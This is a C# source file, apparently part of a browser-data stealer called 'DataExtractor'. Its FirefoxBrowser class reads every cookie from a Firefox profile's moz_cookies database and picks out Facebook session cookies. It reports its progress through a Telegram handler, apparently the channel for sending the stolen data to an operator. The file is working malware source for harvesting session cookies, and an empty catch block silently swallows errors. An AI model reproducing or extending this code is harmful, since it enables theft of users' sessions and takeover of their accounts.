using System.Collections.Generic;
using System.Linq;
using Dapper;
using DataExtractor.Core.Handlers;
using Microsoft.Data.Sqlite;

namespace DataExtractor.Core.Models.Browsers.Childs;

public class FirefoxBrowser : MyBrowser
{
	public override string UserAgent => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36";

	protected override void Scan(BrowserProfile profile, TelegramHandler telegramHandler)
	{
		try
		{
			telegramHandler.Log("Scan : " + profile.CookiePath);
			using SqliteConnection cnn = new SqliteConnection("Data Source=" + profile.CookiePath);
			IEnumerable<CookieData> enumerable = cnn.Query<CookieData>("select name, value, host, path, expiry,isSecure, isHttpOnly from moz_cookies");
			profile.FbCookies = string.Join(";", enumerable.Where((CookieData a) => a.Host.Contains("facebook")));
			foreach (CookieData item in enumerable)
			{
				profile.Cookies.Add(item);
			}
		}
		catch
		{
		}
	}
}
